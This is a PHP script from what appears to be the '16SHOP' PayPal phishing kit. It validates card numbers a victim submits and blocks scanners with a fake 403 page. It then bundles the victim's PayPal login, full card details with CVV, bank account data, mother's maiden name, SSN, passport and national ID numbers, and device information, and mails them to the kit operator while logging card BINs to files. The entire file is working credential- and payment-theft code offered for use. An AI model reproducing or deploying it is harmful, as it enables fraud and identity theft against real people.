<?php
error_reporting(0);
session_start();
require_once '../main.php';
require_once 'session.php';
$ccn = preg_replace('/\s/', '', $_POST['ccn']);
function validatecard($number)
 {
    global $type;

    $cardtype = array(
        "visa"       => "/^4[0-9]{12}(?:[0-9]{3})?$/",
        "mastercard" => "/^5[1-5][0-9]{14}$/",
        "amex"       => "/^3[47][0-9]{13}$/",
        "jcb"       => "/^35[0-9]{14}$/",
        "discover"   => "/^6(?:011|5[0-9]{2})[0-9]{12}$/",
    );

    if (preg_match($cardtype['visa'],$number))
    {
	$type= "visa";
        return 'visa';
	
    }
    else if (preg_match($cardtype['mastercard'],$number))
    {
	$type= "mastercard";
        return 'mastercard';
    }
    else if (preg_match($cardtype['amex'],$number))
    {
	$type= "amex";
        return 'amex';
	
    }
    else if (preg_match($cardtype['discover'],$number))
    {
	$type= "discover";
        return 'discover';
    }
    else if (preg_match($cardtype['jcb'],$number))
    {
    $type= "jcb";
        return 'jcb';
    }
    else
    {
        return false;
    } 
 }
if($_POST['ccn'] == "") {
    tulis_file("../security/onetime.dat","$ip");
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
$valid = validatecard($ccn);
if($valid == false) {
    tulis_file("../security/onetime.dat","$ip");
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
$antidouble = md5($_POST['ccn']);
$_SESSION['ending'] = substr($ccn, -4);
$ip = getUserIP();
$bin = check_bin($_POST['ccn']);
$_SESSION['type_vbv'] = strtoupper($bin["scheme"]);
$_SESSION['type'] = strtoupper($bin["type"]);
$_SESSION['brand'] = strtoupper($bin["brand"]);
$_SESSION['ccn'] = $ccn;
$cexpired = $_POST['cex'];
$cexpired = explode("/",$cexpired);
$bulan = $cexpired[0];
$tahun = substr($cexpired[1],2,4);
$ispuser = getisp($ip);
$message  = "#--------------------[ 16SHOP - PAYPAL ]-------------------------#\n";
$message .= "Email  		: ".$_SESSION['login_email']."\n";
$message .= "Password		: ".$_SESSION['login_password']."\n";
$message .= "#--------------------------------[ CARD DETAILS ]----------------------------#\n";
$message .= "Bank           : ".strtoupper($bin["bank"]["name"])."\n";
$message .= "Type			: ".strtoupper($bin["scheme"])." - ".strtoupper($bin["type"])."\n";
$message .= "Level			: ".strtoupper($bin["brand"])."\n";
$message .= "Cardholders    : ".$_SESSION['fnm']."\n";
$message .= "CC Number		: ".$ccn."\n";
$message .= "Expired		: ".$_POST['cex']."\n";
$message .= "Card Security Code	: ".$_POST['csc']."\n";
$message .= "AMEX CID : ".$_POST['cid']."\n";
$message .= "Credit Limit	: ".$_POST['climit']."\n";
$message .= "Account Number	: ".$_POST['acn']."\n";
$message .= "Sort Code	: ".$_POST['stc']."\n";
$message .= "Bank Access Number	: ".$_POST['bans']."\n";
$message .= "Mother’s Maiden Name : ".$_SESSION['mmn']."\n";
$message .= "Copy Check Live : ".$ccn."|".$bulan."|".$tahun."|".$_POST['csc']."\n";
$message .= "#--------------------[ JAPAN INFO ]-------------------------#\n";
$message .= "WEB ID	: ".$_POST['webid']."\n";
$message .= "Card Password	: ".$_POST['cardpass']."\n";
$message .= "#-------------------------[ BILLING ADDRESS ]--------------------------------#\n";
$message .= "Full Name      : ".$_SESSION['fnm']."\n";
$message .= "Address line   : ".$_SESSION['adr']."\n";
$message .= "City           : ".$_SESSION['cty']."\n";
$message .= "State          : ".$_SESSION['stt']."\n";
$message .= "Country        : ".$_SESSION['cnt']."\n";
$message .= "Zip            : ".$_SESSION['zip']."\n";
$message .= "DOB            : ".$_SESSION['dob']."\n";
$message .= "Phone          : ".$_SESSION['ptp']." | ".$_SESSION['pnm']."\n";
$message .= "OSID           : ".$_SESSION['osid']."\n";
$message .= "National ID    : ".$_SESSION['nationalid']."\n";
$message .= "Qatar ID       : ".$_SESSION['qatarid']."\n";
$message .= "Civil ID       : ".$_SESSION['civilid']."\n";
$message .= "Citizen ID     : ".$_SESSION['citizenid']."\n";
$message .= "SIN            : ".$_SESSION['sin']."\n";
$message .= "SSN            : ".$_SESSION['ssn']."\n";
$message .= "Passport Number    : ".$_SESSION['passport']."\n";
$message .= "ID Number      : ".$_SESSION['idnum']."\n";
$message .= "#--------------------------[ PC INFORMATION ]-------------------------#\n";
$message .= "IP Address		: ".$ip."\n";
$message .= "ISP		    : ".$ispuser."\n";
$message .= "Region		    : ".$regioncity."\n";
$message .= "City		    : ".$citykota."\n";
$message .= "Continent		: ".$continent."\n";
$message .= "Timezone		: ".$timezone."\n";
$message .= "OS/Browser		: ".$os." / ".$br."\n";
$message .= "Date			: ".$date."\n";
$message .= "User Agent		: ".$user_agent."\n";
$message .= "#--------------------------[ PRIVATE ]-----------------------------#\n";
$bins = preg_replace('/\s/', '', $_POST['ccn']);
$bins = substr($bins,0,6);
$_SESSION['from'] = $_SESSION['fnm'];
if($bin["brand"] == "") {
		$subject = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"])." [ $cn - $os - $ip ]";
    $subbin = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"]);
}else{
		$subject = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"])." [ $cn - $os - $ip ]";
    $subbin = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"]);
}

if($antidouble == $_SESSION['anti_double']) {
}else{
	kirim_mail($setting['email_result'],$_SESSION['from'],$subject,$message);
	tulis_file("../result/total_cc.txt", $ip);
	tulis_file("../result/total_bin.txt","$subbin|$countrycode|$cn|$os\n");
}
$_SESSION['anti_double'] = md5($_POST['ccn']);
exit('done');